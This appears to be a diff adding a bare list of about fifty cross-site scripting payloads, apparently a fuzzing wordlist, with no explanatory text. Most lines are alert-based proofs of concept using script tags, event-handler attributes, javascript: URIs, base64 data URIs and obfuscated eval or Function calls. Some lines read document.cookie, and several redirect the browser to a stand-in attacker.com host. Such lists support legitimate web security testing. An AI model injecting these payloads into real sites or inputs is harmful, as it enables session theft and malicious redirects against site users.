@@ -1,0 +1,56 @@
+<script>alert("XSS")</script>
+"><script>alert("XSS")</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert("XSS")>
+<svg onload=alert("XSS")>
+<iframe src=javascript:alert("XSS")>
+<body onload=alert("XSS")>
+<input onfocus=alert("XSS") autofocus>
+<select onfocus=alert("XSS") autofocus>
+<textarea onfocus=alert("XSS") autofocus>
+<keygen onfocus=alert("XSS") autofocus>
+<video><source onerror=alert("XSS")>
+<audio src=x onerror=alert("XSS")>
+<details open ontoggle=alert("XSS")>
+<marquee onstart=alert("XSS")>
+"><img src=x onerror=alert("XSS")>
+'><img src=x onerror=alert('XSS')>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/)</script>
+<script>alert(document.cookie)</script>
+<script>alert(window.location)</script>
+<script>alert(document.domain)</script>
+<script>window.location='http://attacker.com'</script>
+<script>document.location='http://attacker.com'</script>
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=></object>
+<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=></embed>
+<form><button formaction=javascript:alert("XSS")>Click
+<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">
+<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>
+<details ontoggle=alert("XSS")>
+<menu id=x contextmenu=x onshow=alert("XSS")>
+<p contextmenu=x id=x onmouseover=alert("XSS")>Right click
+<img src=x onerror=prompt("XSS")>
+<img src=x onerror=confirm("XSS")>
+<img src=x onerror=eval("alert('XSS')")>
+<img src=x onerror=setTimeout("alert('XSS')",1)>
+<img src=x onerror=setInterval("alert('XSS')",1)>
+<img src=x onerror=Function("alert('XSS')")()>
+<img src=x onerror=new%20Function("alert('XSS')")()>
+<img src=x onerror=window["alert"]("XSS")>
+<img src=x onerror=top["alert"]("XSS")>
+<img src=x onerror=parent["alert"]("XSS")>
+<img src=x onerror=self["alert"]("XSS")>
+<img src=x onerror=this["alert"]("XSS")>
+<img src=x onerror=frames["alert"]("XSS")>
+<img src=x onerror=globalThis["alert"]("XSS")>
+javascript:alert("XSS")
+javascript:alert('XSS')
+javascript:alert(/XSS/)
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert(document.cookie)
+javascript:alert(window.location)
+javascript:alert(document.domain)
+javascript:window.location='http://attacker.com'
+javascript:document.location='http://attacker.com'
